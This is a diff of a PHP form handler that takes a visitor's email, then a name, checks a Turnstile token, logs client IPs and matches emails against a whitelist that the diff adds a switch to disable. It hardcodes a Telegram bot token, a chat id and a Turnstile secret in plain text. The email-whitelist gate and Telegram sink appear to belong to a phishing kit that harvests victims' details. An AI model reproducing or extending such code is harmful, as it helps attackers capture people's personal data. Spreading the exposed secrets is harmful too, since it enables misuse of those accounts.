@@ -2,6 +2,9 @@
 session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
+// === TOGGLE: email validation ON/OFF ===
+$EMAIL_VALIDATION_ENABLED = false; // <<< set to false to DISABLE whitelist email validation
+
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
 $turnstile_secret   = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
@@ -18,12 +21,15 @@ function get_client_ip() {
 $attempts = [];
 if (file_exists(ATTEMPTS_FILE)) {
     $data = json_decode(file_get_contents(ATTEMPTS_FILE), true);
-    if (is_array($data)) $attempts = $data;
+    if (is_array($data)) {
+        $attempts = $data;
+    }
 }
 
-// ----------------------
-// STEP 2: NAME SUBMISSION
-// ----------------------
+/*
+ * STEP 2: NAME SUBMISSION
+ * (process first so Step 2 doesn't accidentally hit Turnstile/email block)
+ */
 if (isset($_POST['name'])) {
     $email = $_SESSION['old_email'] ?? '';
     $name  = trim($_POST['name']);
@@ -85,10 +91,10 @@ if (isset($_POST['name'])) {
     header("Location: dashboard.php"); exit;
 }
 
-// ----------------------
-// STEP 1: EMAIL SUBMISSION
-// only when we are on step 1
-// ----------------------
+/*
+ * STEP 1: EMAIL SUBMISSION
+ * Only when we're at step 1 (or no step set yet)
+ */
 if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] == 1)) {
     $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
     $turnstile_response = $_POST['cf-turnstile-response'] ?? '';
@@ -115,22 +121,30 @@ if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] ==
         header("Location: index.php"); exit;
     }
 
-    // Validate email against whitelist
-    $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $whitelist = array_map('trim', $whitelist);
+    // Validate email against whitelist ONLY if enabled
+    if ($EMAIL_VALIDATION_ENABLED) {
+        if (!file_exists($whitelist_file)) {
+            $_SESSION['error_message'] = "Configuration error: whitelist missing.";
+            header("Location: index.php"); exit;
+        }
 
-    if (!in_array($email, $whitelist)) {
-        $_SESSION['error_message'] = "Email not allowed.";
-        header("Location: index.php"); exit;
+        $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $whitelist = array_map('trim', $whitelist);
+
+        if (!in_array($email, $whitelist, true)) {
+            $_SESSION['error_message'] = "Email not allowed.";
+            header("Location: index.php"); exit;
+        }
     }
 
-    // Email valid, proceed to step 2
+    // Email accepted (validated or validation disabled) → go to step 2
     $_SESSION['step']      = 2;
     $_SESSION['old_email'] = $email;
 
     header("Location: index.php"); exit;
 }
 
+// Fallback redirect
 header("Location: index.php");
 exit;
 ?>
